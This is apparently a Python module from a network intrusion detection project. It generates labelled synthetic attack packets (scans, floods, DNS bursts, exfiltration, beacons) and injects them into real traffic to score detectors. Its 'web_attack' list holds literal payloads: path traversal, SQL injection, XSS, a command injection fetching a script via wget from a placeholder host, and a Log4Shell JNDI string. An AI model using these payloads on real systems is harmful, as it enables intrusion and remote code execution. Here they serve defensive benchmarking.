"""Synthetic attacks injected into real normal traffic, so detectors can be scored with LABELS.

The Mirai capture has no labels, and no public labelled packet capture is on this machine. So we take real held-out normal
traffic and add attacks made by code, each from an existing internal host. Because the attacks are generated, this measures
whether a detector notices these behaviours; it does NOT measure accuracy on real attacks (the traffic of real malware is
messier). Reported as "injection benchmark" everywhere.

Attack kinds (rates are deliberately moderate: the capture's normal traffic is about 30 packets/s):
  hscan      TCP SYN to 300 different addresses on port 23, 15 packets/s            (worm-style horizontal scan)
  vscan      TCP SYN to one address across 1000 ports, 40 packets/s                 (port scan)
  syn_flood  TCP SYN to one address:80, 150 packets/s for 20 s                      (denial of service)
  udp_flood  512-byte UDP to one address, 150 packets/s for 20 s                    (denial of service)
  dns_burst  random 12-letter names under one domain, 8 queries/s for 60 s          (DGA / tunnelling-like)
  exfil      1400-byte TCP packets to one external address, 80 packets/s for 30 s   (bulk upload)
  beacon     98-byte TCP packet to one external address every 15 s for 7 minutes   (low and slow: deliberately hard)
"""
from __future__ import annotations

import ipaddress
import string

import numpy as np

from layered_nids.packets.pcap import Packet

KINDS = ("hscan", "vscan", "syn_flood", "udp_flood", "dns_burst", "exfil", "beacon")
EXTRA_KINDS = ("web_attack", "beacon_conn")        # used by the signature benchmark (they need request lines / connection starts)
SYN, ACK, PSH = 0x02, 0x10, 0x08


def _ext(rng) -> str:
    """A random PUBLIC address (Python also calls the documentation ranges and 172.16/12 etc. private; those are skipped)."""
    while True:
        a = f"{rng.integers(11, 200)}.{rng.integers(0, 255)}.{rng.integers(0, 255)}.{rng.integers(1, 254)}"
        if ipaddress.ip_address(a).is_global:
            return a


def _mk(ts, size, mac, host, dst, proto, sport, dport, qname="", flags=0, httpreq="") -> Packet:
    return Packet(float(ts), int(size), mac, "ff:ff:ff:00:00:01", host, dst, proto, int(sport), int(dport), qname, flags, httpreq)


def make_attack(kind: str, host: str, mac: str, start: float, rng: np.random.Generator) -> list[Packet]:
    out: list[Packet] = []
    if kind == "hscan":
        for i, t in enumerate(start + np.arange(300) / 15.0):
            out.append(_mk(t, 60, mac, host, f"10.{rng.integers(0, 255)}.{rng.integers(0, 255)}.{rng.integers(1, 254)}" if i % 2 else _ext(rng),
                           "tcp", rng.integers(1025, 65000), 23, flags=SYN))
    elif kind == "vscan":
        target = _ext(rng)
        for t, port in zip(start + np.arange(1000) / 40.0, rng.permutation(np.arange(1, 1001))):
            out.append(_mk(t, 60, mac, host, target, "tcp", 40000 + int(port) % 20000, port, flags=SYN))
    elif kind == "syn_flood":
        target = _ext(rng)
        for t in start + np.arange(3000) / 150.0:
            out.append(_mk(t, 60, mac, host, target, "tcp", rng.integers(1025, 65000), 80, flags=SYN))
    elif kind == "udp_flood":
        target = _ext(rng)
        for t in start + np.arange(3000) / 150.0:
            out.append(_mk(t, 512, mac, host, target, "udp", rng.integers(1025, 65000), rng.integers(1, 65000)))
    elif kind == "dns_burst":
        domain = "".join(rng.choice(list(string.ascii_lowercase), 8)) + ".com"
        for t in start + np.arange(480) / 8.0:
            label = "".join(rng.choice(list(string.ascii_lowercase + string.digits), 12))
            out.append(_mk(t, 80, mac, host, "8.8.8.8", "udp", rng.integers(1025, 65000), 53, qname=f"{label}.{domain}"))
    elif kind == "exfil":
        target = _ext(rng)
        sp = int(rng.integers(1025, 65000))
        for t in start + np.arange(2400) / 80.0:
            out.append(_mk(t, 1400, mac, host, target, "tcp", sp, 443, flags=ACK | PSH))
    elif kind == "beacon":
        target = _ext(rng)
        for t in start + np.arange(28) * 15.0:
            out.append(_mk(t, 98, mac, host, target, "tcp", rng.integers(1025, 65000), 443, flags=ACK | PSH))
    elif kind == "web_attack":
        target = _ext(rng)
        reqs = ("GET v.example /download?file=../../../../etc/passwd", "GET v.example /item.php?id=1' OR 1=1--", "GET v.example /?q=<script>alert(1)</script>",
                "POST v.example /cgi-bin/run.cgi;wget http://203.0.113.9/a.sh", "GET v.example /a/${jndi:ldap://203.0.113.9/x}", "GET v.example /.env")
        for t, r in zip(start + np.arange(len(reqs)) * 5.0, reqs):
            out.append(_mk(t, 300, mac, host, target, "tcp", rng.integers(1025, 65000), 80, flags=ACK | PSH, httpreq=r))
    elif kind == "beacon_conn":                                    # a new connection every ~15 s (the SYN is what a beacon repeats)
        target, t = _ext(rng), start
        for _ in range(28):
            out.append(_mk(t, 74, mac, host, target, "tcp", rng.integers(1025, 65000), 443, flags=SYN))
            t += 15.0 + float(rng.normal(0, 0.3))
    else:
        raise ValueError(f"unknown attack kind {kind!r}; choose from {KINDS + EXTRA_KINDS}")
    return out


def inject(normal: list, kinds=KINDS, seed: int = 0, margin_s: float = 20.0):
    """Merge attacks into `normal` (time-ordered Packet list). Each kind comes from its OWN internal host (the busiest ones, in a
    seeded random order) and starts at a random time that leaves room for it inside the stretch.

    Returns (packets, labels, episodes): `labels[i]` is the attack kind of packet i ('' = normal);
    `episodes` is a list of dicts {kind, host, start, end, n_packets}."""
    from collections import Counter

    from layered_nids.common.hosts import valid_internal
    rng = np.random.default_rng(seed)
    t0, t1 = normal[0].ts, normal[-1].ts
    busy = [h for h, _ in Counter(p.src for p in normal if valid_internal(p.src)).most_common(12)]
    if len(busy) < len(kinds):
        raise ValueError(f"need at least {len(kinds)} internal hosts to inject from, found {len(busy)}")
    hosts = list(rng.permutation(busy))[:len(kinds)]
    mac_of = {}
    for p in normal:
        if p.src in hosts and p.src not in mac_of:
            mac_of[p.src] = p.src_mac
    extra, tags, episodes = [], [], []
    for kind, host in zip(kinds, hosts):
        probe = make_attack(kind, host, mac_of.get(host, "00:00:00:00:00:00"), 0.0, np.random.default_rng(seed))
        length = probe[-1].ts - probe[0].ts
        room = (t1 - t0) - length - 2 * margin_s
        if room <= 0:
            raise ValueError(f"the stretch is too short for a {kind} attack ({length:.0f}s)")
        start = t0 + margin_s + float(rng.uniform(0, room))
        pk = make_attack(kind, host, mac_of.get(host, "00:00:00:00:00:00"), start, rng)
        extra += pk
        tags += [kind] * len(pk)
        episodes.append({"kind": kind, "host": host, "start": pk[0].ts, "end": pk[-1].ts, "n_packets": len(pk)})
    allp = [(p.ts, 0, i, p, "") for i, p in enumerate(normal)] + [(p.ts, 1, i, p, k) for i, (p, k) in enumerate(zip(extra, tags))]
    allp.sort(key=lambda r: (r[0], r[1], r[2]))
    return [r[3] for r in allp], np.array([r[4] for r in allp]), episodes
